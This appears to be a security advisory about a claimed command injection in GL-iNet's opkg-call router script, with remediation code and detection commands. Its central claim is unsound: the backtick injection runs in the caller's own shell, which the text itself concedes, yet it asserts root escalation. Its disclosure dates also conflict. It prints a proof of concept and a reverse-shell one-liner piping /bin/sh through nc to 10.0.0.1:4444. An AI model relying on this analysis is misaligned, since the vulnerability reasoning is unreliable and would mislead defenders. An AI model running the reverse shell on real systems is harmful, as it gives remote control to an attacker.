# Command Injection Vulnerability in GL-iNet /usr/libexec/opkg-call

## Executive Summary

A local command injection vulnerability exists in the `/usr/libexec/opkg-call` script on GL-iNet routers. The vulnerability stems from improper shell variable quoting, allowing authenticated attackers with SSH or local shell access to execute arbitrary commands with root privileges through command substitution in package names.

## Vulnerability Details

**Vendor:** GL-iNet  
**Product:** GL-AXT1800 (Slate AX) Router and potentially other models  
**Affected Component:** `/usr/libexec/opkg-call`  
**Affected Firmware:** v4.6.8 and potentially earlier versions  
**Vulnerability Type:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)  
**CVE Status:** Pending assignment  
**Attack Vector:** Local  
**Authentication Required:** Yes (SSH/local shell access)  
**Privileges Required:** Low (authenticated user)  
**User Interaction:** None  
**CVSS Score:** 7.8 (High) - AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## Technical Analysis

### Vulnerable Code

The vulnerability exists in lines 19-37 of `/usr/libexec/opkg-call`:
```bash
install|update|remove)
    (
        opkg="opkg"
        while [ -n "$1" ]; do
            case "$1" in
                --autoremove|--force-overwrite|--force-removal-of-dependent-packages)
                    opkg="$opkg $1"
                    shift
                ;;
                -*)
                    shift
                ;;
                *)
                    break
                ;;
            esac
        done
        if flock -x 200; then
            $opkg $action "$@" </dev/null >/tmp/opkg.out 2>/tmp/opkg.err  # VULNERABLE LINE
            code=$?
```

### Root Cause Analysis

The critical vulnerability occurs on line 37:
```bash
$opkg $action "$@" </dev/null >/tmp/opkg.out 2>/tmp/opkg.err
```

**Three security issues exist:**

1. **Unquoted `$opkg` variable expansion**
   - Causes word splitting on IFS characters (space, tab, newline)
   - Enables glob pattern expansion
   - Special characters are interpreted by the shell

2. **Unquoted `$action` variable expansion**
   - Subject to word splitting and pathname expansion
   - Can be manipulated through the calling context

3. **Command substitution in arguments**
   - While `"$@"` is properly quoted, the calling script context doesn't prevent command substitution
   - Backticks and `$()` are evaluated **before** the function receives arguments

### Exploitation Mechanism

The vulnerability is exploited through shell command substitution in package names:

**Proof of Concept:**
```bash
/usr/libexec/opkg-call install `id > /tmp/pwned`
```

**Attack Flow:**

1. Attacker gains SSH access (weak password, leaked credentials, etc.)
2. Executes `opkg-call` with command substitution in package name parameter
3. Shell evaluates backticks/`$()` constructs before argument passing
4. Arbitrary commands execute with the privileges of the calling process
5. Command output becomes part of arguments passed to opkg

**Advanced Exploitation:**
```bash
# Reverse shell
/usr/libexec/opkg-call install `mkfifo /tmp/p; nc 10.0.0.1 4444 < /tmp/p | /bin/sh > /tmp/p 2>&1`

```

## Impact Assessment

### Severity Justification

**High Severity (CVSS 7.8)** - Despite requiring local access, the impact is severe:

1. **Privilege Escalation**: Commands execute with root privileges
2. **Complete System Compromise**: Full control over router firmware
3. **Persistence Mechanisms**: Ability to install backdoors and rootkits
4. **Network Pivot**: Router compromise enables lateral movement to internal network
5. **Data Exfiltration**: Access to router configuration, VPN credentials, network traffic

### Attack Scenarios

#### Scenario 1: Compromised SSH Credentials
- Attacker obtains SSH credentials via phishing or credential stuffing
- Executes exploit to gain root shell
- Installs persistent backdoor
- Uses router as pivot point for internal network reconnaissance

#### Scenario 2: Supply Chain Attack
- Web interface or API calls `opkg-call` with user-controlled input
- Insufficient input validation allows command injection
- Attacker gains root access through authenticated web session


## Exploitation Prerequisites

### Required Access

- SSH access to the router, OR
- Local shell access through another vulnerability, OR
- Web interface that calls `opkg-call` without proper sanitization

### Typical Credentials

GL-iNet routers often have:
- Default SSH username: `root`
- Web-configurable password (often weak or default)
- SSH enabled by default on local network

## Remediation

### Immediate Mitigation

1. **Disable SSH Access**: Restrict SSH to trusted management networks only
```bash
   # In /etc/config/dropbear
   option Interface 'lan'
   option GatewayPorts 'off'
```

2. **Strong Authentication**: Implement key-based SSH authentication
```bash
   # Disable password authentication
   option PasswordAuth 'off'
   option RootPasswordAuth 'off'
```

3. **Network Segmentation**: Isolate router management interface
   - Use separate VLAN for management
   - Implement firewall rules restricting SSH access

4. **Access Controls**: Use SSH authorized_keys with command restrictions
```
   command="/usr/bin/safe-command" ssh-rsa AAAA...
```

### Proper Code Fix

#### Option 1: Quote All Variables
```bash
# BEFORE (Vulnerable)
$opkg $action "$@" </dev/null >/tmp/opkg.out 2>/tmp/opkg.err

# AFTER (Partially Fixed)
"$opkg" "$action" "$@" </dev/null >/tmp/opkg.out 2>/tmp/opkg.err
```

**Note:** This prevents word splitting but doesn't stop command substitution in the calling context.

#### Option 2: Input Validation (Recommended)
```bash
#!/bin/sh
. /usr/share/libubox/jshn.sh

action=$1
shift

# Validate action against strict whitelist
case "$action" in
    install|update|remove|list-installed|list-available)
        ;;
    *)
        echo "Invalid action: $action" >&2
        exit 1
        ;;
esac

# Validate package names
validate_package_name() {
    local pkg="$1"
    # Only allow alphanumeric, dash, underscore, dot
    case "$pkg" in
        *[!a-zA-Z0-9._-]*)
            echo "Invalid package name: $pkg" >&2
            return 1
            ;;
        ..*)
            echo "Invalid package name: $pkg" >&2
            return 1
            ;;
    esac
    return 0
}

case "$action" in
    list-installed)
        cat /usr/lib/opkg/status
    ;;
    list-available)
        lists_dir=$(sed -rne 's#^lists_dir \S+ (\S+)#\1#p' /etc/opkg.conf /etc/opkg/*.conf 2>/dev/null | tail -n 1)
        find "${lists_dir:-/usr/lib/opkg/lists}" -type f '!' -name '*.sig' | xargs -r gzip -cd
    ;;
    install|update|remove)
        (
            opkg="opkg"
            while [ -n "$1" ]; do
                case "$1" in
                    --autoremove|--force-overwrite|--force-removal-of-dependent-packages)
                        opkg="$opkg $1"
                        shift
                    ;;
                    -*)
                        shift
                    ;;
                    *)
                        break
                    ;;
                esac
            done
            
            # Validate all package names
            for pkg in "$@"; do
                if ! validate_package_name "$pkg"; then
                    json_init
                    json_add_int code 1
                    json_add_string stderr "Invalid package name: $pkg"
                    json_dump
                    exit 1
                fi
            done
            
            if flock -x 200; then
                # Use proper quoting
                "$opkg" "$action" "$@" </dev/null >/tmp/opkg.out 2>/tmp/opkg.err
                code=$?
                stdout=$(cat /tmp/opkg.out)
                stderr=$(cat /tmp/opkg.err)
            else
                code=255
                stderr="Failed to acquire lock"
            fi
            json_init
            json_add_int code $code
            [ -n "$stdout" ] && json_add_string stdout "$stdout"
            [ -n "$stderr" ] && json_add_string stderr "$stderr"
            json_dump
        ) 200>/tmp/opkg.lock
        rm -f /tmp/opkg.lock /tmp/opkg.err /tmp/opkg.out
    ;;
esac
```

#### Option 3: Use Arrays (Bash-specific)
```bash
#!/bin/bash
# Note: Requires bash, not POSIX sh

opkg_cmd=(opkg)

while [ -n "$1" ]; do
    case "$1" in
        --autoremove|--force-overwrite|--force-removal-of-dependent-packages)
            opkg_cmd+=("$1")
            shift
            ;;
        -*)
            shift
            ;;
        *)
            break
            ;;
    esac
done

# Execute with proper array expansion
"${opkg_cmd[@]}" "$action" "$@" </dev/null >/tmp/opkg.out 2>/tmp/opkg.err
```

## Detection and Monitoring

### Log Indicators

Monitor system logs for suspicious `opkg-call` invocations:
```bash
# Check for command substitution characters in logs
grep -E '`|\$\(' /var/log/messages

# Monitor opkg activity
tail -f /tmp/opkg.out /tmp/opkg.err

# Check for unusual package installation attempts
logread | grep opkg-call
```

### Network Indicators

- Unexpected outbound connections from router
- DNS queries to suspicious domains
- Connections to known command-and-control infrastructure

### File System Indicators
```bash
# Check for suspicious files
find /tmp -type f -mtime -1
find /etc/crontabs -type f -mtime -1

# Check for backdoors
ls -la /etc/rc.d/
cat /etc/crontabs/root
```

## Affected Products

### Confirmed Vulnerable
- **GL-AXT1800** firmware v4.6.8

### Potentially Affected
All GL-iNet router models using the same `opkg-call` implementation:
- GL-MT3000 (Beryl AX)
- GL-MT6000 (Flint 2)
- GL-AXT1800 (Slate AX)
- GL-A1300 (Slate Plus)
- GL-AR750S (Slate)
- GL-X750 (Spitz)
- And potentially others

**Recommendation:** Check for the presence of `/usr/libexec/opkg-call` and verify if it contains unquoted variable expansion.

## Vendor Response

**Status:** Pending disclosure to GL.iNet security team

**Expected Timeline:**
- Initial notification: [Date]
- 90-day disclosure window
- Public disclosure after patch availability

## References

### Technical Resources
- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command  
  https://cwe.mitre.org/data/definitions/78.html

- **Shell Command Injection**  
  https://owasp.org/www-community/attacks/Command_Injection

- **Bash Pitfalls - Unquoted Variables**  
  https://mywiki.wooledge.org/BashPitfalls#pf1

- **ShellCheck - Shell Script Analysis**  
  https://www.shellcheck.net/

### Related Vulnerabilities
- **CVE-2024-57391**: Command Injection via Web RPC (Related)

### Vendor Resources
- **GL.iNet Security Updates**  
  https://www.gl-inet.com/security-updates/

- **GL.iNet Support Forum**  
  https://forum.gl-inet.com/

## Timeline

- **Discovery Date:** November 2024
- **Initial Analysis:** November 2024
- **CVE Request:** Pending
- **Vendor Notification:** Pending
- **Expected Patch:** TBD
- **Public Disclosure:** 90 days post-notification or upon patch availability

## Author

**Aleksa Zatezalo**
- Cybersecurity Researcher
- DC381 - DEF CON Group Belgrade
- Certifications: OSCP, OSWP, OSCE3, CISSP
- Contact: [Responsible disclosure via vendor security team]

## Legal Disclaimer

This research was conducted on personally-owned equipment for security research purposes. The information is provided to:

1. Enable GL.iNet to develop security patches
2. Assist network administrators in implementing mitigations
3. Raise awareness of IoT security issues

**This information is for authorized security testing only. Unauthorized access to computer systems is illegal.**

## Acknowledgments

Special thanks to:
- GL.iNet for their commitment to security
- The security research community
- DC381 members for peer review

---

**Document Version:** 1.0  
**Last Updated:** November 2025  
**Classification:** Public (Post-Disclosure)